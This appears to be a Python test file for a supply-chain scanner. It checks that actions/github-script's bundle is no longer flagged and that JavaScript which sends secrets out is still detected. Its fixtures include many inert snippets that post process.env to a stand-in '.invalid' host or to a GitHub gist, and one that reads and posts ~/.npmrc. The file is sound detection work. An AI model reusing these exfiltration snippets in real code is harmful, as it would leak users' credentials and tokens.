"""FP-GITHUB-SCRIPT (0.1.9): the official actions/github-script at 3a2844b was SC-IMPORT-RISK CRITICAL ("dist/index.js
runs when the action runs (runs.main), and it reads credentials or the whole environment and sends data over the
network", line 2176, `req.write(data, 'utf8')` in @actions/http-client), on 9 uses in vercel/next.js's workflows.

Its dist/index.js is 2,228,144 characters, past the supply-chain tree's 2,000,000, so the text follower read it, by
names: @actions/exec's `_cloneExecOptions` gives a `result` a child process's environment (`env: options.env ||
process.env`), and TypeScript's `__importStar` helper, 12 KB on, has a `result` of its own, read as that one; every
module imported through the helper then held the environment, a child's stdout callback's `data` with it, and
http-client's `data` (a parameter of `requestRawWithCallback`) was read as that one. A variable a function declares
(`const`, `let`, `var`) and a callback's parameter are now that function's, where the function's body's end is
certain: what they hold reaches its body, the calls it makes and, by its return, its callers (where the reading
before reached the same by the name alone: a method's parameter of the variable's name, `this.send(data)`, and a
variable of the name an instance's method returns, `const data = s.grab()`), never another function's variable of
the name. A reading that met one of
the follower's limits reads the text as before too, and reports what either finds (the review of Oct 18:
test_fp_github_script_review.py). BIG-BUNDLE-TAIL: the follower's lists hold what a text of its length can, so
github-script's whole bundle meets none, and the follower alone is quiet on it too (the supply-chain tree, which reads
it now, always was).

What is still found: the whole environment (or a credential store) sent in a body, a query, an object it was copied
or spread into, through helpers (past the text's first 200 functions and calls too), a closure, a class's methods, an
instance's, a callback, to GitHub's API; past a body's end that a brace counter misreads.

Payloads are inert: nothing is installed or run; the addresses are `.invalid`.
"""
import unittest

from lazaret.registry import repo
from lazaret.scanner import core
from tests.registry import _actions_support as fx

SHA = "3a2844b7e9c422d3c10d287c895573f7108da1b3"
WHOLE = ("environment", "the whole environment", False)
HARVEST = "reads credentials or the whole environment and sends data over the network"
ACTION_YML = "name: x\nruns:\n  using: node24\n  main: dist/index.js\n"
# functions after which a text is a bundle's (longer than _LD_LONG, the pack's limits past: BIG-BUNDLE-TAIL); statements
# after which it is as long and meets none of them; a comment that takes it past the tree's limit; called functions
# that fill the text's first _LD_MAX functions and calls
LONG = "".join("function f%d(a) { return a + %d; }\n" % (k, k) for k in range(8000))
PLAIN = "\n" + "void 0;\n" * 40000
PAST = "/*" + " pad" * 520000 + "*/\n"
CALLED = "".join("function h%d(a) { return a + %d; }\nh%d(%d);\n" % (k, k, k, k) for k in range(250))

# actions/github-script's bundle cut to the names that carried "the whole environment" to `req.write(data, "utf8")`
GITHUB_SCRIPT = """var __importStar = (this && this.__importStar) || (function () {
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k in mod) if (k !== "default") result[k] = mod[k];
        return result;
    };
})();
const cp = __importStar(require("child_process"));
const https = __importStar(require("https"));
class ToolRunner {
    exec() {
        const child = cp.spawn(this.toolPath, this.args, this._getSpawnOptions(this.options));
        child.stdout.on("data", (data) => {
            this.emit("stdline", data);
        });
    }
    _cloneExecOptions(options) {
        options = options || {};
        const result = {
            cwd: options.cwd || process.cwd(),
            env: options.env || process.env,
            silent: options.silent || false
        };
        return result;
    }
}
class HttpClient {
    putJson(requestUrl, obj, additionalHeaders = {}) {
        return __awaiter(this, void 0, void 0, function* () {
            const data = JSON.stringify(obj, null, 2);
            const res = yield this.put(requestUrl, data, additionalHeaders);
            return this._processResponse(res, this.requestOptions);
        });
    }
    requestRawWithCallback(info, data, onResult) {
        const req = info.httpModule.request(info.options, (msg) => {
            onResult(undefined, msg);
        });
        if (data && typeof data === "string") {
            req.write(data, "utf8");
        }
        req.end();
    }
    _processResponse(res, options) {
        return __awaiter(this, void 0, void 0, function* () {
            let obj;
            let contents;
            contents = yield res.readBody();
            if (contents && contents.length > 0) {
                obj = JSON.parse(contents);
            }
            return obj;
        });
    }
}
"""
GITHUB_SCRIPT_EXEC = GITHUB_SCRIPT.replace(
    "        const child = cp.spawn(this.toolPath, this.args, this._getSpawnOptions(this.options));",
    "        const optionsNonNull = this._cloneExecOptions(this.options);\n"
    "        const child = cp.spawn(this.toolPath, this._getSpawnArgs(optionsNonNull), this._getSpawnOptions(this.options));")
NOT_GIVEN = ("const https = require('https');\nfunction a() {\n  const data = JSON.stringify(process.env);\n"
             "  console.log(data.length);\n  b('hello');\n}\nfunction b(data) {\n"
             "  const req = https.request({ host: 'c.invalid', method: 'POST' });\n  req.write(data);\n  req.end();\n}\na();\n")

SENDS = {
    "a body": "async function main() {\n  await fetch('https://c.invalid/x', { method: 'POST', body: JSON.stringify(process.env) });\n}\nmain();\n",
    "a query of its entries": "const https = require('https');\nconst q = Object.entries(process.env).map(([k, v]) => k + '=' + encodeURIComponent(v)).join('&');\nhttps.get('https://c.invalid/x?' + q);\n",
    "copied into an object": "const https = require('https');\nfunction collect() {\n  const out = {};\n  for (const k of Object.keys(process.env)) out[k] = process.env[k];\n  return out;\n}\nconst body = JSON.stringify(collect());\nconst req = https.request({ hostname: 'c.invalid', method: 'POST' });\nreq.write(body);\nreq.end();\n",
    "spread and posted": "const axios = require('axios');\nasync function run() {\n  const payload = { ...process.env, at: Date.now() };\n  await axios.post('https://c.invalid/x', payload);\n}\nrun();\n",
    "a gist": "async function run() {\n  const body = JSON.stringify({ files: { 'e.json': { content: JSON.stringify(process.env) } } });\n  await fetch('https://api.github.com/gists', { method: 'POST', headers: { authorization: 'token ' + process.env.GITHUB_TOKEN }, body });\n}\nrun();\n",
    "an axios helper": "const axios = require('axios');\nfunction send(url, data) {\n  return axios.post(url, data);\n}\nfunction main() {\n  const env = process.env;\n  send('https://c.invalid/x', { env });\n}\nmain();\n",
    "a class's methods": "const https = require('https');\nclass Reporter {\n  collect() {\n    const result = { env: process.env, cwd: process.cwd() };\n    return result;\n  }\n  send() {\n    const data = JSON.stringify(this.collect());\n    const req = https.request({ host: 'c.invalid', method: 'POST' });\n    req.write(data, 'utf8');\n    req.end();\n  }\n}\nnew Reporter().send();\n",
    "a parameter of the same name": "const https = require('https');\nfunction a() {\n  const data = JSON.stringify(process.env);\n  b(data);\n}\nfunction b(data) {\n  const req = https.request({ host: 'c.invalid', method: 'POST' });\n  req.write(data);\n  req.end();\n}\na();\n",
    "a parameter of another name": "const https = require('https');\nfunction a() {\n  const snapshot = JSON.stringify(process.env);\n  b(snapshot);\n}\nfunction b(payload) {\n  const req = https.request({ host: 'c.invalid', method: 'POST' });\n  req.write(payload);\n  req.end();\n}\na();\n",
    "three helpers": "function collect() {\n  const all = Object.assign({}, process.env);\n  pack(all);\n}\nfunction pack(obj) {\n  const text = JSON.stringify(obj);\n  ship(text);\n}\nfunction ship(body) {\n  fetch('https://c.invalid/x', { method: 'POST', body: body });\n}\ncollect();\n",
    "a closure": "const https = require('https');\nfunction start() {\n  const blob = JSON.stringify(process.env);\n  setTimeout(() => {\n    const req = https.request({ host: 'c.invalid', method: 'POST' });\n    req.end(blob);\n  }, 0);\n}\nstart();\n",
    "a callback's parameter, to a helper": "const all = [process.env];\nall.forEach((e) => {\n  post(e);\n});\nfunction post(x) {\n  fetch('https://c.invalid/x', { method: 'POST', body: JSON.stringify(x) });\n}\n",
    "past a regular expression's brace": "function go(s) {\n  const e = JSON.stringify(process.env);\n  const t = s.replace(/}/g, '');\n  fetch('https://c.invalid/x', { method: 'POST', body: e + t });\n}\ngo('');\n",
    "past a template in a template": "function go(a) {\n  const e = JSON.stringify(process.env);\n  const t = `${a ? `}` : ''}`;\n  fetch('https://c.invalid/x', { method: 'POST', body: e + t });\n}\ngo(1);\n",
    "a method's parameter of the same name": "const https = require('https');\nclass R {\n  run() {\n    const data = JSON.stringify(process.env);\n    this.send(data);\n  }\n  send(data) {\n    const req = https.request({ host: 'c.invalid', method: 'POST' });\n    req.write(data);\n    req.end();\n  }\n}\nnew R().run();\n",
    "an instance's method's return": "class Stealer {\n  grab() {\n    const data = JSON.stringify(process.env);\n    return data;\n  }\n}\nconst s = new Stealer();\nconst data = s.grab();\nfetch('https://c.invalid/x', { method: 'POST', body: data });\n",
}
NPMRC = ("const fs = require('fs');\nconst os = require('os');\nfunction go() {\n"
         "  const t = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');\n"
         "  fetch('https://c.invalid/x', { method: 'POST', body: t });\n}\ngo();\n")


def sent(text):
    got = core.local_data_sent_at(text)
    return None if got is None else tuple(got[1:])


def action_risks(js):
    res = repo.scan_action(fx.archive("actions/github-script", SHA, {"action.yml": ACTION_YML, "dist/index.js": js}), "")
    return [(i["sev"], i["line"], i["msg"]) for i in res["issues"] if i["rule"] == "SC-IMPORT-RISK"]


class GithubScriptTests(unittest.TestCase):
    def test_its_bundles_names_carry_nothing(self):
        for what, text in (("github-script", GITHUB_SCRIPT), ("with exec's options", GITHUB_SCRIPT_EXEC),
                           ("a parameter not given it", NOT_GIVEN)):
            with self.subTest(what):
                self.assertIsNone(sent(text))
                self.assertIsNone(sent(text + PLAIN))
                self.assertEqual(core.import_time_risk(text + PAST, "js"), ([], None))

    def test_a_bundles_text_is_read_whole(self):
        # the filler's 8,000 functions: the follower's lists hold them all (BIG-BUNDLE-TAIL), no limit is met, and
        # the narrowing reading answers
        for what, text in (("github-script", GITHUB_SCRIPT), ("a parameter not given it", NOT_GIVEN)):
            with self.subTest(what):
                self.assertIsNone(sent(text + LONG))

    def test_the_action_is_quiet(self):
        self.assertEqual(action_risks(GITHUB_SCRIPT + PAST), [])
        self.assertEqual(action_risks(GITHUB_SCRIPT_EXEC + PAST), [])


class SendsTests(unittest.TestCase):
    def test_the_whole_environment_sent_is_followed(self):
        for what, text in SENDS.items():
            with self.subTest(what):
                self.assertEqual(sent(text), WHOLE)
                self.assertEqual(sent(text + LONG), WHOLE)
                self.assertEqual(sent(text + PLAIN), WHOLE)

    def test_past_the_texts_first_functions_and_calls(self):
        for what in ("a parameter of the same name", "a parameter of another name", "three helpers",
                     "a callback's parameter, to a helper"):
            with self.subTest(what):
                self.assertEqual(sent(CALLED + SENDS[what] + LONG), WHOLE)

    def test_a_credential_stores_file(self):
        for text in (NPMRC, NPMRC + LONG):
            kind, what, address = sent(text)
            self.assertEqual((kind, address), ("file", False))
            self.assertIn(".npmrc", what)

    def test_through_the_action_scan(self):
        for what in ("a body", "a gist", "a parameter of another name", "a callback's parameter, to a helper",
                     "an instance's method's return"):
            with self.subTest(what):
                text = SENDS[what] + PAST
                self.assertEqual([(s, m) for s, _, m in action_risks(text)],
                                 [("CRITICAL", "dist/index.js runs when the action runs (runs.main), and it " + HARVEST + ".")])
        self.assertEqual([s for s, _, _ in action_risks(NPMRC + PAST)], ["CRITICAL"])

    def test_beside_github_scripts_names(self):
        # the action's bundle with an exfiltration of its own: found, at the exfiltration
        for what in ("a body", "a parameter of another name"):
            with self.subTest(what):
                text = GITHUB_SCRIPT + SENDS[what] + PAST
                got = action_risks(text)
                self.assertEqual([s for s, _, _ in got], ["CRITICAL"])
                self.assertGreater(got[0][1], GITHUB_SCRIPT.count("\n"))


if __name__ == "__main__":
    unittest.main()
